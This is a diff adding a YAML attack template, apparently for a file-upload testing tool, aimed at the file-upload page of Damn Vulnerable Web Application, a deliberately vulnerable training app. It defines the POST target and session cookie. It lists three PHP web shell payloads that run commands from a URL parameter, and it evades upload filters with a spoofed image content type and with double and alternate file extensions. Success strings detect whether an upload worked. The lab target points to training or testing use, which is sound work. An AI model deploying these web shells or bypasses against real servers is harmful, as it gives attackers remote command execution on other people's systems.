@@ -1,0 +1,52 @@
+name: "DVWA File Upload Attack"
+description: "Targeted attack against Damn Vulnerable Web Application file upload"
+author: "@HaakimSec"
+version: "1.0"
+tech_stack: "php"
+
+target:
+  endpoint: "/dvwa/vulnerabilities/upload/"
+  method: "POST"
+  param: "uploaded"
+
+headers:
+  Cookie: "PHPSESSID={{session}}; security=low"
+  User-Agent: "Mozilla/5.0"
+
+form_data:
+  MAX_FILE_SIZE: "100000"
+  upload: "Upload"
+
+payloads:
+  - name: "DVWA PHP webshell"
+    filename: "shell.php"
+    extension: ".php"
+    content_type: "image/jpeg"
+    body: |
+      <?php system($_GET['cmd']); ?>
+    tags: ["dvwa", "php", "webshell"]
+
+  - name: "DVWA double extension bypass"
+    filename: "shell.jpg.php"
+    extension: ".php"
+    content_type: "image/jpeg"
+    body: |
+      <?php system($_GET['cmd']); ?>
+    tags: ["dvwa", "double-extension", "bypass"]
+
+  - name: "DVWA PHP5 bypass"
+    filename: "shell.php5"
+    extension: ".php5"
+    content_type: "image/jpeg"
+    body: |
+      <?php system($_GET['cmd']); ?>
+    tags: ["dvwa", "alt-extension", "bypass"]
+
+success_indicators:
+  - "succesfully uploaded"
+  - "shell.php"
+  - "image was uploaded"
+
+failure_indicators:
+  - "Your image was not uploaded"
+  - "Sorry, only JPG/PNG"
